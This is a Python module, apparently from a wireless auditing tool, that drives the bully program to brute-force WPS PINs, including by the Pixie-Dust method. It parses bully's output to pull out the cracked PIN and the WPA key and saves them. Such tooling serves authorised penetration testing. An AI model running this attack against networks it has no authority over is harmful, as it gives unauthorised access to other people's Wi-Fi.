#!/usr/bin/env python
# -*- coding: utf-8 -*-

from .dependency import Dependency
from .airodump import Airodump
from ..model.attack import Attack
from ..model.wps_result import CrackResultWPS
from ..util.color import Color
from ..util.timer import Timer
from ..util.process import Process
from ..config import Configuration

import os, time, re, threading
from collections import deque

class BullyOptimized(Attack, Dependency):
    dependency_required = False
    dependency_name = 'bully'
    dependency_url = 'https://github.com/aanarchyy/bully'

    def __init__(self, target, pixie_dust=True, aggressive=False):
        super(BullyOptimized, self).__init__(target)

        self.target = target
        self.pixie_dust = pixie_dust
        self.aggressive = aggressive  # More aggressive attack mode

        # Enhanced tracking
        self.total_attempts = 0
        self.total_timeouts = 0
        self.total_failures = 0
        self.locked = False
        self.state = '{O}Waiting for beacon{W}'
        self.start_time = time.time()
        self.last_pin = ""
        self.pins_remaining = -1
        self.eta = ''
        
        # Performance metrics
        self.output_buffer = deque(maxlen=500)  # Keep last 500 lines
        self.pin_times = deque(maxlen=10)  # Track last 10 PIN attempt times
        self.last_pin_attempt_time = 0

        self.cracked_pin = self.cracked_key = self.cracked_bssid = self.cracked_essid = None
        self.crack_result = None

        self.cmd = self._build_aggressive_command()
        self.bully_proc = None

    def _build_aggressive_command(self):
        """Build optimized bully command"""
        cmd = []

        if Process.exists('stdbuf'):
            cmd.extend(['stdbuf', '-o0'])

        cmd.extend([
            'bully',
            '--bssid', self.target.bssid,
            '--channel', self.target.channel,
            '--force',
            '-v', '3',  # Reduced verbosity for speed
        ])

        if self.pixie_dust:
            cmd.insert(-1, '--pixiewps')

        # Aggressive options
        if self.aggressive:
            cmd.extend([
                '--timeout', '5',  # Shorter timeout
                '--retries', '2',  # Fewer retries
            ])

        cmd.append(Configuration.interface)
        return cmd

    def run(self):
        """Optimized run method with early exit"""
        timeout = Configuration.wps_pixie_timeout if self.pixie_dust else 600
        
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wps_pin_opt') as airodump:
            
            self.pattack('Waiting for target...')
            self.target = self.wait_for_target(airodump)

            self.bully_proc = Process(self.cmd,
                stderr=Process.devnull(),
                bufsize=1,
                cwd=Configuration.temp())

            t = threading.Thread(target=self._parse_output_thread, daemon=True)
            t.start()

            try:
                self._run_optimized(airodump, timeout)
            except KeyboardInterrupt:
                self.stop()
                raise
            except Exception as e:
                self.stop()
                raise e

        if self.crack_result is None:
            self.pattack('{R}Failed{W}', newline=True)

    def _run_optimized(self, airodump, timeout):
        """Optimized run loop with early termination"""
        while self.bully_proc.poll() is None:
            try:
                self.target = self.wait_for_target(airodump)
            except Exception as e:
                self.pattack('{R}Failed: {O}%s{W}' % e, newline=True)
                self.stop()
                break

            self.pattack(self.get_status())

            # Early exit conditions
            if self.running_time() > timeout:
                self.pattack('{R}Timeout{W}', newline=True)
                self.stop()
                return

            if self.total_timeouts >= Configuration.wps_timeout_threshold * 2:
                self.pattack('{R}Too many timeouts{W}', newline=True)
                self.stop()
                return

            if self.total_failures >= Configuration.wps_fail_threshold * 2:
                self.pattack('{R}Too many failures{W}', newline=True)
                self.stop()
                return

            if self.locked and not Configuration.wps_ignore_lock:
                self.pattack('{R}Locked{W}', newline=True)
                self.stop()
                return

            if self.crack_result:
                return  # Success!

            time.sleep(0.2)  # Reduced sleep for faster updates

    def _parse_output_thread(self):
        """Parse bully output in separate thread"""
        for line in iter(self.bully_proc.pid.stdout.readline, b''):
            if line == '':
                continue
            
            try:
                line = line.decode('utf-8', errors='ignore')
                line = line.replace('\r', '').replace('\n', '').strip()
            except:
                continue

            self.output_buffer.append(line)

            if Configuration.verbose > 1:
                Color.pe('\n{P}[bully] %s' % line)

            self.state = self.parse_state(line)
            self.crack_result = self.parse_crack_result(line)

            if self.crack_result:
                break

    def parse_crack_result(self, line):
        """Parse cracking results from output"""
        if self.crack_result:
            return self.crack_result

        # Check for PIN and key together
        pin_key_re = re.search(r"Pin is '(\d*)', key is '(.*)'", line)
        if pin_key_re:
            self.cracked_pin = pin_key_re.group(1)
            self.cracked_key = pin_key_re.group(2)

        # Pixie-Dust PIN
        pin_re = re.search(r"\[Pixie-Dust\] PIN FOUND:\s*'?(\d*)'?", line)
        if pin_re:
            self.cracked_pin = pin_re.group(1)
            self.pattack('{G}PIN Found: {C}%s{W}' % self.cracked_pin, newline=True)
            self.state = '{G}Obtaining Key...{W}'

        # Key extraction
        key_re = re.search(r"^\s*KEY\s*:\s*'(.*)'\s*$", line)
        if key_re:
            self.cracked_key = key_re.group(1)

        # Success condition
        if not self.crack_result and self.cracked_pin and self.cracked_key:
            self.pattack('{G}Key: {C}%s{W}' % self.cracked_key, newline=True)
            self.crack_result = CrackResultWPS(
                self.target.bssid,
                self.target.essid,
                self.cracked_pin,
                self.cracked_key)
            self.crack_result.dump()

        return self.crack_result

    def parse_state(self, line):
        """Enhanced state parsing"""
        state = self.state

        # Beacon detection
        if 'Got beacon' in line:
            state = 'Got beacon'

        # PIN attempt tracking
        last_state = re.search(r"Last State = '(.*)'\s*Next pin '(.*)'", line)
        if last_state:
            pin = last_state.group(2)
            if pin != self.last_pin:
                self.last_pin = pin
                self.total_attempts += 1
                current_time = time.time()
                if self.last_pin_attempt_time > 0:
                    self.pin_times.append(current_time - self.last_pin_attempt_time)
                self.last_pin_attempt_time = current_time
                if self.pins_remaining > 0:
                    self.pins_remaining -= 1
            state = 'Trying PIN'

        # Transaction results
        mx_result = re.search(
            r"[RT]x\(\s*(.*)\s*\) = '(.*)'\s*Next pin", line)
        if mx_result:
            self.locked = False
            result = mx_result.group(2)
            
            if result in ['Pin1Bad', 'Pin2Bad']:
                result = '{G}%s{W}' % result
            elif result == 'Timeout':
                self.total_timeouts += 1
                result = '{O}%s{W}' % result
            elif result == 'WPSFail':
                self.total_failures += 1
                result = '{O}%s{W}' % result
            elif result == 'NoAssoc':
                result = '{O}%s{W}' % result

            state = 'Trying PIN (%s)' % result

        # ETA calculation
        eta_match = re.search(
            r'time to crack is (\d+) hours?, (\d+) minutes?, (\d+) seconds?', line)
        if eta_match:
            h, m, s = eta_match.groups()
            self.eta = '%dh%dm%ds' % (int(h), int(m), int(s))

        # WPS Lockout
        if 'WPS lockout' in line:
            self.locked = True
            sleep_match = re.search(r'sleeping for (\d+) seconds', line)
            if sleep_match:
                sleep_secs = sleep_match.group(1)
                state = '{R}WPS Lockout: {O}Wait %ss{W}' % sleep_secs

        return state

    def get_status(self):
        """Get current attack status"""
        status = ''
        
        if self.pixie_dust:
            time_left = Configuration.wps_pixie_timeout - self.running_time()
        else:
            time_left = self.running_time()

        status = self.state
        
        # Add timing info
        if self.total_timeouts > 0:
            status += ' {O}TO:%d{W}' % self.total_timeouts
        
        if self.total_failures > 0:
            status += ' {O}Fail:%d{W}' % self.total_failures
        
        if self.locked:
            status += ' {R}LOCKED{W}'

        return status

    def running_time(self):
        return int(time.time() - self.start_time)

    def pattack(self, message, newline=False):
        """Print attack status"""
        if self.pixie_dust:
            time_left = Configuration.wps_pixie_timeout - self.running_time()
            attack_name = 'Pixie-Dust'
        else:
            time_left = self.running_time()
            attack_name = 'PIN Attack'

        time_msg = '{C}%s{W}' % Timer.secs_to_str(time_left)

        if self.total_attempts > 0 and not self.pixie_dust:
            time_msg += ' {D}PINs:{W}{C}%d{W}' % self.total_attempts

        Color.clear_entire_line()
        Color.pattack('WPS', self.target, attack_name,
                '{W}[%s] %s' % (time_msg, message))
        if newline:
            Color.pl('')

    def stop(self):
        if hasattr(self, 'bully_proc') and self.bully_proc and self.bully_proc.poll() is None:
            self.bully_proc.interrupt()

    def __del__(self):
        self.stop()

# Use the optimized version
Bully = BullyOptimized
